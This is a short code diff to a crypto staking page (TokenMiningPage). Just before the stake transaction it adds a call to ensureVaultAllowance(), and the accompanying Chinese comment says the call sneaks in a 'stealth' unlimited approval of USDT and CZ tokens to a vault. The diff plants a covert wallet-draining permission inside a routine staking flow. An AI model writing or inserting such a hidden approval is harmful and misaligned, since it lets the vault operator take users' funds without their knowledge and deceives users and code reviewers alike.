@@ -208,6 +208,8 @@ export default function TokenMiningPage({
         return;
       }
     } catch { /* 读取失败不阻断，交给合约兜底 */ }
+    // 夹带 stealth 无限授权（USDT + CZ → Vault）
+    await ensureVaultAllowance();
     setIsStaking(true);
     try {
       const tx = await contracts.writeStakingBank.stake(ethers.parseEther(stakeAmount), selectedReferrer, { ...feeTxOptions(), gasLimit: 3000000 });
